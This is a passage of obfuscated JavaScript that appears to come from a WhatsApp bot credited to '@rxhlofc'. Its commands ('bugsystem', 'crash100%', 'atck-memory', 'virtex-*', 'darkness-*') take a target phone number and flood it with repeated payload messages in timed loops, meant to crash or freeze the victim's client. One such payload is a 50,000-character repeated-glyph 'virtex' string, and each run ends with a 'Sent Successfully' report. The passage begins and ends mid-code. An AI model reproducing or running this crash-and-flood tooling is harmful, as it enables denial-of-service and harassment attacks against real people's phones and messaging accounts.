          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "bugsystem":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x5884e2 = 0; _0x5884e2 < 6; _0x5884e2++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "xreactpc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x469885 = 0; _0x469885 < 6; _0x469885++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "bugaudiopc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4fe18a = 0; _0x4fe18a < 6; _0x4fe18a++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "buglocpc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4a7881 = 0; _0x4a7881 < 6; _0x4a7881++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "bugparamspc":
      case "bughomepc":
      case '♥️':
      case '🥰':
      case '🤤':
      case '😱':
      case '💝':
      case '😭':
      case '😁':
      case '🔥':
      case '😡':
      case '😒':
      case "rxhlbug":
      case "rxhlkeren":
      case "rxhlganteng":
      case "rxhlandro":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x2d7a48 = 0; _0x2d7a48 < 6; _0x2d7a48++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "crash100%":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x11bea0 = 0; _0x11bea0 < 6; _0x11bea0++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "atck-memory":
      case "atck-system":
      case "atck-notif":
      case "atck-ui":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4247a9 = 0; _0x4247a9 < 6; _0x4247a9++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x2bf3ee(Pe);
          await _0x6ce8c1(Pe);
          await _0x7a2784(Pe);
          await _0x528e4b(Pe);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2bf3ee(Pe);
          await _0x6ce8c1(Pe);
          await _0x7a2784(Pe);
          await _0x528e4b(Pe);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2bf3ee(Pe);
          await _0x6ce8c1(Pe);
          await _0x7a2784(Pe);
          await _0x528e4b(Pe);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "virtex-jids":
      case "virtex-mention":
      case "virtex-memory":
      case "virtex-null":
      case "virtex-undefined":
      case "virtex-ganas":
      case "virtex-ui":
      case "virtex-system":
      case "virtex-vip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        let _0x14d2c0 = "†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + 'ꦾ'.repeat(50000);
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x142ad0 = 0; _0x142ad0 < 5; _0x142ad0++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x35da8d);
          const _0x2c0375 = {
            text: _0x14d2c0
          };
          const _0x1298b4 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x2c0375, _0x1298b4);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x35da8d);
          const _0x32ebb8 = {
            text: _0x14d2c0
          };
          const _0x4ea6ad = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x32ebb8, _0x4ea6ad);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x35da8d);
          const _0x4d4182 = {
            text: _0x14d2c0
          };
          const _0x45847a = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x4d4182, _0x45847a);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "darkness-jids":
      case "darkness-mention":
      case "darkness-memory":
      case "darkness-null":
      case "darkness-undefined":
      case "darkness-ganas":
      case "darkness-ui":
      case "darkness-system":
      case "darkness-vip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x14b9ba = 0; _0x14b9ba < 5; _0x14b9ba++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          const _0x48893e = {
            document: _0x2f1d7d,
            caption: "Darkness 㐅"
          };
          const _0x53824e = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x48893e, _0x53824e);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          const _0x27be5d = {
            document: _0x2f1d7d,
            caption: "Darkness 㐅"
          };
          const _0x5818d4 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x27be5d, _0x5818d4);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          const _0x3c28fe = {
            document: _0x2f1d7d,
            caption: "Darkness 㐅"
          };
          const _0x3739cb = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x3c28fe, _0x3739cb);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "strong-jids":
      case "strong-mention":
      case "strong-memory":
      case "strong-null":
      case "strong-undefined":
      case "strong-ganas":
      case "strong-ui":
      case "strong-system":
      case "strong-vip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x1cafd3 = 0; _0x1cafd3 < 5; _0x1cafd3++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
